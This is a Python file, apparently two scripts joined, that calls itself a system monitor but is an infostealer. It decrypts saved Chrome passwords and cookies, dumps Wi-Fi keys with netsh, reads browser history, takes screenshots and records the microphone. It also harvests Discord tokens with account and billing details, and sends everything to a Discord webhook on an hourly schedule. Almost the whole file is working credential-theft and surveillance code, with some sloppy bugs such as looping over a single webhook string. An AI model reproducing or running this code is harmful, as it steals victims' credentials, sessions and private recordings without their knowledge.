import os
import sys
import platform
import psutil
import cpuinfo
import socket
import uuid
import requests
import time
import schedule
import shutil
import json
import base64
import subprocess
import sqlite3
from datetime import datetime, timedelta
from Crypto.Cipher import AES


import pyautogui
import sounddevice as sd
from scipy.io.wavfile import write
from discord_webhook import DiscordWebhook, DiscordEmbed

cipher = AES.new(b"thisisakey123456", AES.MODE_EAX)

import win32crypt  # pip install pywin32

import matplotlib.pyplot as plt

# === SETTINGS ===
import requests

# Your webhook URLs
webhook_urls = "https://discord.com/api/webhooks/WEBHOOK_ID_1/WEBHOOK_TOKEN_1"
# Your message
data = {
    "content": "Hello from Python!"
}

# Send to both
for url in webhook_urls:
    response = requests.post(url, json=data)
    print(f"Sent to {url[-30:]}, status: {response.status_code}")

LOG_FILE = "system_log.txt"
GRAPH_FILE = "usage_graph.png"
SCREENSHOT_FILE = "screenshot.png"
AUDIO_FILE = "recording.wav"
EMAIL_FILE = "user_email.txt"

cpu_history = []
ram_history = []
timestamp_history = []

# === EMAIL ===
def get_user_email():
    try:
        email = subprocess.check_output(["git", "config", "user.email"], stderr=subprocess.DEVNULL).decode().strip()
        if email:
            return email
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass
    for env_var in ["EMAIL", "USEREMAIL", "USER_EMAIL"]:
        email = os.environ.get(env_var)
        if email:
            return email
    if os.path.exists(EMAIL_FILE):
        with open(EMAIL_FILE, "r") as f:
            email = f.read().strip()
            if email:
                return email
    email = input("Enter your email: ").strip()
    with open(EMAIL_FILE, "w") as f:
        f.write(email)
    return email

# === LOCATION ===
def get_ip_location():
    try:
        data = requests.get('http://ip-api.com/json/', timeout=5).json()
        if data.get('status') == 'success':
            return {
                'Latitude': data.get('lat'),
                'Longitude': data.get('lon'),
                'City': data.get('city'),
                'Region': data.get('regionName'),
                'Country': data.get('country')
            }
    except:
        pass
    return None

# === SCREENSHOT ===
def take_screenshot(filename=SCREENSHOT_FILE):
    try:
        shot = pyautogui.screenshot()
        shot.save(filename)
        return filename
    except Exception as e:
        print(f"Screenshot failed: {e}")
        return None

# === AUDIO RECORDING ===
def record_audio(duration=10, filename=AUDIO_FILE):
    try:
        fs = 44100
        audio = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        write(filename, fs, audio)
        return filename
    except Exception as e:
        print(f"Mic recording failed: {e}")
        return None

# === BROWSER HISTORY ===
def get_browser_history():
    history = []
    paths = {
        "Chrome": os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History"),
        "Edge": os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\History"),
        "Firefox": os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles")
    }
    for browser, path in paths.items():
        if browser == "Firefox":
            if not os.path.exists(path): continue
            for profile in os.listdir(path):
                history_path = os.path.join(path, profile, "places.sqlite")
                if os.path.exists(history_path):
                    try:
                        conn = sqlite3.connect(history_path)
                        cursor = conn.cursor()
                        cursor.execute("SELECT url, datetime(last_visit_date/1000000,'unixepoch') FROM moz_places ORDER BY last_visit_date DESC LIMIT 10")
                        history += [f"{browser}: {row[0]} @ {row[1]}" for row in cursor.fetchall()]
                        conn.close()
                    except:
                        pass
        else:
            if not os.path.exists(path): continue
            tmp = path + "_tmp"
            try:
                shutil.copy2(path, tmp)
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute("SELECT url, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT 10")
                history += [f"{browser}: {row[0]} @ {row[1]}" for row in cursor.fetchall()]
                conn.close()
                os.remove(tmp)
            except:
                pass
    return history if history else ["No browser history found or access denied."]

# === USAGE COLLECTION ===
def collect_usage():
    cpu = psutil.cpu_percent(interval=0.5)
    ram = psutil.virtual_memory().percent
    now = datetime.now().strftime("%H:%M")
    cpu_history.append(cpu)
    ram_history.append(ram)
    timestamp_history.append(now)
    if len(cpu_history) > 60:
        cpu_history.pop(0)
        ram_history.pop(0)
        timestamp_history.pop(0)

def generate_usage_graph():
    plt.style.use('dark_background')
    plt.figure(figsize=(10, 4))
    plt.plot(timestamp_history, cpu_history, label="CPU %", color="cyan")
    plt.plot(timestamp_history, ram_history, label="RAM %", color="magenta")
    plt.xlabel("Time")
    plt.ylabel("Usage %")
    plt.title("CPU and RAM Usage (Last Hour)")
    plt.legend()
    plt.tight_layout()
    plt.savefig(GRAPH_FILE)
    plt.close()

# === SYSTEM INFO ===
def get_system_info():
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        local_ip = "?"
    try:
        public_ip = requests.get("https://api.ipify.org", timeout=3).text
    except:
        public_ip = "?"
    location = get_ip_location()
    email = get_user_email()
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                   for ele in range(0, 8 * 6, 8)][::-1]).upper()
    boot_time = datetime.fromtimestamp(psutil.boot_time())
    uptime_str = str(timedelta(seconds=int((datetime.now() - boot_time).total_seconds())))
    disk = psutil.disk_usage('/')
    disk_info = f"Total: {disk.total // (1024**3)} GB, Used: {disk.used // (1024**3)} GB, Free: {disk.free // (1024**3)} GB"
    processes = sorted(psutil.process_iter(['pid', 'name', 'cpu_percent']), key=lambda p: p.info['cpu_percent'], reverse=True)
    top_processes = [f"{p.info['name']} (PID {p.info['pid']}): {p.info['cpu_percent']}%" for p in processes[:5]]
    history = get_browser_history()

    cookies = get_chrome_cookies()
    passwords = get_chrome_passwords()
    wifi_pwds = get_wifi_passwords()

    return {
        "Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "Email": email,
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Platform": platform.platform(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "CPU Info": cpuinfo.get_cpu_info().get("brand_raw", "N/A"),
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
        "RAM (GB)": round(psutil.virtual_memory().total / (1024**3), 2),
        "Disk Space": disk_info,
        "Uptime": uptime_str,
        "Running Processes": len(psutil.pids()),
        "Local IP": local_ip,
        "Public IP": public_ip,
        "MAC Address": mac,
        "Top CPU Processes": top_processes,
        "Browser History": history,
        "Geo Location": location if location else "Unavailable",
        "Chrome Cookies": cookies,
        "Chrome Passwords": passwords,
        "WiFi Passwords": wifi_pwds,
    }

# === CHROME DECRYPTION HELPERS ===
def get_chrome_master_key():
    local_state_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove DPAPI prefix
    try:
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        print(f"Failed to get Chrome master key: {e}")
        return None

def decrypt_password(buff, master_key):
    try:
        if buff.startswith(b'v10'):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()  # remove 16-byte tag
            return decrypted_pass
        else:
            decrypted_pass = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
            return decrypted_pass
    except Exception as e:
        return f"Failed to decrypt: {e}"

# === CHROME COOKIES ===
def get_chrome_cookies():
    cookies_list = []
    cookies_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Cookies")
    if not os.path.exists(cookies_path):
        return ["Chrome cookies not found."]
    tmp_cookies = "Cookies_tmp"
    try:
        shutil.copy2(cookies_path, tmp_cookies)
        conn = sqlite3.connect(tmp_cookies)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 10")
        master_key = get_chrome_master_key()
        for host_key, name, encrypted_value in cursor.fetchall():
            decrypted_value = decrypt_password(encrypted_value, master_key)
            cookies_list.append(f"{host_key} | {name} : {decrypted_value}")
        conn.close()
    except Exception as e:
        cookies_list.append(f"Failed to read cookies: {e}")
    finally:
        if os.path.exists(tmp_cookies):
            os.remove(tmp_cookies)
    return cookies_list if cookies_list else ["No cookies found."]

# === CHROME PASSWORDS ===
def get_chrome_passwords():
    passwords_list = []
    login_data_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
    if not os.path.exists(login_data_path):
        return ["Chrome Login Data not found."]
    tmp_login = "Login_tmp"
    try:
        shutil.copy2(login_data_path, tmp_login)
        conn = sqlite3.connect(tmp_login)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 10")
        master_key = get_chrome_master_key()
        for origin_url, username, encrypted_password in cursor.fetchall():
            decrypted_pass = decrypt_password(encrypted_password, master_key)
            passwords_list.append(f"URL: {origin_url} | Username: {username} | Password: {decrypted_pass}")
        conn.close()
    except Exception as e:
        passwords_list.append(f"Failed to read passwords: {e}")
    finally:
        if os.path.exists(tmp_login):
            os.remove(tmp_login)
    return passwords_list if passwords_list else ["No saved passwords found."]

# === WIFI PASSWORDS (Windows only) ===
def get_wifi_passwords():
    wifi_list = []
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
        profiles = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]
        for profile in profiles:
            try:
                key_output = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True)
                key_lines = key_output.split('\n')
                key = None
                for line in key_lines:
                    if "Key Content" in line:
                        key = line.split(":")[1].strip()
                        break
                wifi_list.append(f"SSID: {profile} | Password: {key if key else 'None'}")
            except Exception as e:
                wifi_list.append(f"SSID: {profile} | Password: Failed to retrieve: {e}")
    except Exception as e:
        wifi_list.append(f"Failed to get wifi profiles: {e}")
    return wifi_list if wifi_list else ["No wifi profiles found or access denied."]

# === SEND TO DISCORD ===
def send_to_discord(info, webhook_url, graph_path=None, screenshot_path=None, audio_path=None):
    summary_lines = [
        f"**Time:** {info.get('Time')}",
        f"**Email:** {info.get('Email')}",
        f"**OS:** {info.get('OS')} {info.get('OS Version')}",
        f"**CPU:** {info.get('CPU Info')}",
        f"**RAM (GB):** {info.get('RAM (GB)')}",
        f"**Disk Space:** {info.get('Disk Space')}",
        f"**Uptime:** {info.get('Uptime')}",
        f"**Local IP:** {info.get('Local IP')}",
        f"**Public IP:** {info.get('Public IP')}",
    ]

    location = info.get("Geo Location")
    if isinstance(location, dict):
        city = location.get("City", "?")
        region = location.get("Region", "?")
        country = location.get("Country", "?")
        lat = location.get("Latitude")
        lon = location.get("Longitude")
        map_link = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else "N/A"
        summary_lines.append(f"**Location:** {city}, {region}, {country} | [Map]({map_link})")

    summary_text = "**🖥️ System Monitor Report Summary:**\n" + "\n".join(summary_lines)

    # Compose detailed text file with passwords and cookies
    detail_lines = []
    for k, v in info.items():
        if isinstance(v, list):
            detail_lines.append(f"{k}:")
            detail_lines.extend(f"  - {item}" for item in v)
        elif isinstance(v, dict):
            detail_lines.append(f"{k}:")
            for subk, subv in v.items():
                detail_lines.append(f"  {subk}: {subv}")
        else:
            detail_lines.append(f"{k}: {v}")

    details_filename = "system_report_details.txt"
    with open(details_filename, "w", encoding="utf-8") as f:
        f.write("\n".join(detail_lines))

    try:
        webhook = DiscordWebhook(url=webhook_url, content=summary_text)

        # Attach files if they exist
        for file_path in [graph_path, screenshot_path, audio_path, details_filename]:
            if file_path and os.path.exists(file_path):
                with open(file_path, "rb") as f:
                    webhook.add_file(file=f.read(), filename=os.path.basename(file_path))

        response = webhook.execute()
        if response.status_code in [200, 204]:
            print("✅ Report sent to Discord!")
        else:
            print(f"❌ Discord responded with status {response.status_code}: {response.text}")
    except Exception as e:
        print(f"❌ Exception during Discord send: {e}")
    finally:
        if os.path.exists(details_filename):
            os.remove(details_filename)

# === MAIN REPORTING JOB ===
def report_job():
    collect_usage()
    info = get_system_info()
    generate_usage_graph()
    screenshot = take_screenshot()
    audio = record_audio()
    send_to_discord(info, webhook_urls, GRAPH_FILE, screenshot, audio)
    # Log to file
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        for k, v in info.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")

def start_monitor():
    print("📈 Starting monitor...")
    report_job()
    schedule.every(1).hours.do(report_job)
    while True:
        schedule.run_pending()
        time.sleep(5)

if __name__ == "__main__":
    start_monitor()

import os
import re
import json
import base64
import shutil
import sqlite3
import requests
import subprocess
import platform
from datetime import datetime
import win32crypt
from Crypto.Cipher import AES


# Discord token extraction paths
DISCORD_PATHS = [
    os.path.expandvars(r"%APPDATA%\discord"),
    os.path.expandvars(r"%LOCALAPPDATA%\Discord"),
    os.path.expandvars(r"%APPDATA%\discordcanary"),
    os.path.expandvars(r"%LOCALAPPDATA%\discordptb"),
    os.path.expandvars(r"%APPDATA%\Lightcord"),
]

def get_tokens_from_path(path):
    tokens = []
    leveldb_path = os.path.join(path, "Local Storage", "leveldb")
    if not os.path.exists(leveldb_path):
        return tokens
    for filename in os.listdir(leveldb_path):
        if not filename.endswith((".log", ".ldb")):
            continue
        try:
            with open(os.path.join(leveldb_path, filename), errors="ignore") as f:
                content = f.read()
                # Regex for normal and mfa tokens
                tokens += re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content)
                tokens += re.findall(r"mfa\.[\w-]{84}", content)
        except:
            continue
    return list(set(tokens))

def get_discord_user_info(token):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            # Get Nitro info
            nitro = "None"
            res = requests.get("https://discord.com/api/v10/users/@me/billing/subscriptions", headers=headers, timeout=5)
            if res.status_code == 200 and len(res.json()) > 0:
                nitro = "Has Nitro"
            return {
                "Username": f"{data.get('username')}#{data.get('discriminator')}",
                "Email": data.get("email"),
                "Phone": data.get("phone"),
                "MFA Enabled": data.get("mfa_enabled"),
                "Nitro Status": nitro,
                "User ID": data.get("id"),
            }
    except:
        return None

def get_chrome_master_key():
    local_state_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # remove DPAPI prefix
    try:
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_chrome_password(buff, master_key):
    try:
        if buff[:3] == b"v10":
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16].decode()
            return decrypted
        else:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
    except:
        return "Failed to decrypt"

def get_chrome_passwords(limit=5):
    passwords = []
    login_db = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
    if not os.path.exists(login_db):
        return ["Chrome login data not found."]
    tmp_db = "LoginDataTmp"
    try:
        shutil.copy2(login_db, tmp_db)
        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT ?", (limit,))
        master_key = get_chrome_master_key()
        for url, user, enc_pass in cursor.fetchall():
            dec_pass = decrypt_chrome_password(enc_pass, master_key) if master_key else "No master key"
            passwords.append(f"URL: {url} | Username: {user} | Password: {dec_pass}")
        conn.close()
    except Exception as e:
        passwords.append(f"Error reading Chrome passwords: {e}")
    finally:
        if os.path.exists(tmp_db):
            os.remove(tmp_db)
    return passwords

def save_report(report_str):
    filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(report_str)
    return filename

def send_to_webhook(content, filename=None):
    data = {"content": content}
    files = None
    if filename and os.path.exists(filename):
        files = {"file": open(filename, "rb")}
    try:
        r = requests.post(webhook_urls, data=data, files=files)
        if files:
            files["file"].close()
        return r.status_code == 204 or r.status_code == 200
    except:
        return False

def main():
    all_tokens = []
    for path in DISCORD_PATHS:
        tokens = get_tokens_from_path(path)
        if tokens:
            all_tokens.extend(tokens)

    all_tokens = list(set(all_tokens))
    if not all_tokens:
        print("No tokens found.")
        return

    report_lines = []
    report_lines.append(f"Extracted {len(all_tokens)} tokens.\n")

    for t in all_tokens:
        user_info = get_discord_user_info(t)
        if user_info:
            report_lines.append(f"Token: {t}")
            for k,v in user_info.items():
                report_lines.append(f"  {k}: {v}")
            report_lines.append("")
        else:
            report_lines.append(f"Token: {t} (Failed to get user info)\n")

    # Get Chrome passwords (limited)
    report_lines.append("Chrome saved passwords (limited):")
    report_lines.extend(get_chrome_passwords())

    report_text = "\n".join(report_lines)

    # Save locally
    report_file = save_report(report_text)

    # Send to webhook
    success = send_to_webhook("**Discord Token & User Info Report:**", report_file)

    if success:
        print("Report sent to webhook!")
    else:
        print("Failed to send report to webhook.")

if __name__ == "__main__":
    main()







from Crypto.Cipher import AES
import base64
import requests

